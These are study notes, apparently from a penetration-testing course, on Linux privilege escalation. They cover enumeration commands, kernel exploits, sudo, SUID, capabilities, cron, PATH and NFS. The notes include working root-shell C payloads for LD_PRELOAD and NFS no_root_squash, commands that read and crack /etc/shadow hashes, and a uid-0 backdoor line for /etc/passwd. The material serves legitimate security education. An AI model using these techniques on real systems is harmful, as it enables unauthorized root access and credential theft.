- At it's core, **Privilege Escalation usually involves going from a lower permission account to a higher permission one**. More technically, it's the exploitation of a vulnerability, design flaw, or configuration 
  oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.  
- It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access.
- ## Enumeration
	- Enumeration is the first step you have to take once you gain access to any system.
	- ### `hostname`
		- The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).
	- ### `uname -a`
		- Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.
	- ### `cat /proc/version`
		- The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.
		- Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
	- ### `cat /etc/issue`
		- Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.
	- ### `ps`
		- The `ps` command is an effective way to see the running processes on a Linux system. Typing `ps` on your terminal will show processes for the current shell.
	- ### `env`
		- The `env` command will show environmental variables.
	- ### `sudo -l`
		- The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.
	- ### `id`
		- The `id` command will provide a general overview of the user’s privilege level and
		  group memberships.  
		- It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.
	- ### `cat /etc/passwd`
		- Reading the `/etc/passwd` file can be an easy way to discover users on the system.
	- ### `ifconfig`
		- The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system.
	- ### `netstat`
		- The `netstat` command can be used with several different options to gather information on existing
		  connections.  
		- `netstat -a`: shows all listening ports and established connections.
		- `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols
		  respectively.  
		- `netstat -l`: List ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
		- `netstat -s`: list network usage statistics by protocol (below) This can also be used with the 
		  `-t` or `-u` options to limit the output to a specific protocol.  
		- `netstat -tp`: list connections with the service name and PID information.
	- ### `find`
		- Go ahead [redhat/sysadmin/linux-find-command](https://www.redhat.com/sysadmin/linux-find-command)
- ## Automated Enumeration Tools
	- The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.
		- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
		- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
		- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
		- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
		- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
- ## Kernel Exploit
	- Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.
	- The kernel on Linux systems manages the communication between components such as the memory on the system and applications. **This critical function requires the kernel to have specific privileges**; thus, a successful exploit will potentially lead to root privileges.
	- Although it looks simple, **please remember that a failed kernel exploit can lead to a system crash**. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.
	- **Research sources: **
		- Based on your findings, you can use Google to search for an existing exploit code.
		- Sources such as [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) can also be useful.
		- Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
	- **Hints/Notes:**
		- Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit.
		- Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later.
		- Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
		- Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
		- You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.
- ## Sudo Life Hacks
	- Any user can check its current situation related to root privileges using the `sudo -l` command.
	- [gtfobins.github.io](https://gtfobins.github.io/) is a **valuable source that provides information on how any program, on which you may have sudo rights, can be used.**
	- **Leverage application functions**
		- Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.
		- In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).
		- Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.
	- **Leverage LD_PRELOAD**
		- On some systems, you may see the LD_PRELOAD environment option.
		- LD_PRELOAD is a function that allows any program to use shared libraries. 
		  This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD.   
		    
		  **If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run.** Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.  
		- The steps of this privilege escalation vector can be summarized as follows:
			- Check for LD_PRELOAD (with the env_keep option) => use `sudo -l`
			- Write a simple C code compiled as a share object (.so extension) file
			- Run the program with **sudo** rights and the LD_PRELOAD option pointing to our .so file
		- The C code will simply spawn a root shell and can be written as follows:
		  ```c
		  #include <stdio.h>
		  #include <sys/types.h>
		  #include <stdlib.h>
		  
		  void _init() {
		    unsetenv("LD_PRELOAD");  
		    setgid(0);  
		    setuid(0);  
		    system("/bin/bash");  
		    }
		  ```
		- We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters:
		  ```bash
		  gcc -fPIC -shared -o shell.so shell.c -nostartfiles
		  ```
		- We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
			- We need to run the program by specifying the LD_PRELOAD option, as follows:
			  ```bash
			  sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
			  ```
			- This will result in a shell spawn with root privileges.
- ## SUID
	- Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions.
	- By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.
	- You will notice these files have an “s” bit set showing their special permission level.
	  ```bash
	  find / -type f -perm -04000 -ls 2>/dev/null
	  ```
	  will **list files that have SUID or SGID bits set**.  
	- **A good practice would be to compare** executables on this list with [GTFOBins](https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list `https://gtfobins.github.io/#+suid`.
	- If able to get `passwd` file and `shadow` file from `/etc/`. You can 
	  ```bash
	  unshadow passwd.txt shadow.txt > passwords.txt
	  ```
	    
	  and then crack the `passwords.txt` using john-the-ripper:  
	  ```bash
	  john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
	  ```
	- If able to get `read and write` perm on `passwd` file then you can go ahead and modify it and add a user.
		- Create a salted password hash for your new user:
		  ```bash
		  openssl passwd -1 -salt PNK password1
		  ```
		- Copy the salted pass hash and use it to create a new user inside `passwd` file.
		  For example:  
		  ```bash
		  hacker:[salt]:0:0:root:/root:/bin/bash
		  ```
- ## Capabilities
	- Capabilities help manage privileges at a more granular level.
	- **For example**, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
	- We can **list out the enabled capabilities** :
	  ```bash
	  getcap -r / 2>/dev/null
	  ```
	- Then we can compare if there are any executables on this list with [GTFOBins](https://gtfobins.github.io) and find any capabilities vulnerability.
- ## CRON Jobs
	- **Cron jobs are used to run scripts or binaries at specific times.** By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
	- The idea is quite simple; **if there is a scheduled task that runs with root privileges and we can change the script that will be run** , then our script will run with root privileges.
	- Any user can read the file keeping system-wide cron jobs under `/etc/crontab`
	  ```bash
	  cat /etc/crontab
	  ```
	- Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:
		- System administrators need to run a script at regular intervals.
		- They create a cron job to do this
		- After a while, the script becomes useless, and they delete it
		- They do not clean the relevant cron job
- ## `PATH` Exploitation
	- If a folder for which your user has **write** permission is located in the path, you could potentially **hijack** an application to run a script.
	- PATH in Linux is an environmental variable that tells the operating system where to search for executables.
	- For any command that is not built into the shell or that is **not** defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).
	- View the path: 
	  ```bash
	  echo $PATH
	  ```
	- Add a directory in the path:
	  ```bash
	  export PATH=/tmp:$PATH
	  ```
	- Ask yourself the following questions while thinking about PATH exploitation:
		- What folders are located under $PATH?
		- Does your current user have write privileges for any of these folders?
		  You can look and compare the output of the following command with that of PATH variable:  
		  ```bash
		  find / -writable 2>/dev/null
		  ```
		- Can you modify $PATH?
		- Is there a script/application you can start that will be affected by this vulnerability?
	- Let's say there is a script or application which has special privileges. When you run that script or application, it tries to launch a system binary for which it will ask `$PATH` to look for and `$PATH` will look for that binary inside folders present in the `$PATH` variable.
	- What makes a privilege escalation possible within this context is that the path script runs with root privileges.
- ## NFS (Network File Sharing)
	- Another vector that is more relevant to CTFs and exams is a misconfigured network shell.
	- NFS (Network File Sharing) configuration is kept in the `/etc/exports` file. This file is created during the NFS server installation and **can usually be read by users**.
	- The critical element for this privilege escalation vector is the `no_root_squash` option.
	  ![image.png](../assets/image_1689075532460_0.png)  
	- By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the `no_root_squash` option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
	- Step-by-step:
		- We will start by enumerating **mountable shares** from our attacking machine.
		  ```bash
		  showmount -e [TARGET_IP]
		  ```
		- Make sure to match with `cat /etc/exports` as to which **mountable share** has `no_root_sqash` option and which one can you access in the target machine.
		- Mount the mountable (on attacker machine and first create a dir in /tmp i.e `/tmp/targetShareMount` on attack machine):
		  ```bash
		  mount -o rw [TARGET_IP]:/tmp /tmp/targetShareMount
		  ```
		- `cd` into `/tmp/targetShareMount` and create our executable:
		  ```c
		  int main()
		  {
		  	setuid(0);
		      setgid(0);
		      system("/bin/bash");
		      return 0;
		  }
		  ```
		- Save and compile the executable (nfs.c):
		  ```bash
		  gcc nfs.c -o nfs -w
		  ```
		- Give `nfs` executable the special privilege:
		  ```bash
		  chmod +s nfs
		  ```
		- Execute `nfs` executable in the target machine to gain `root` access.
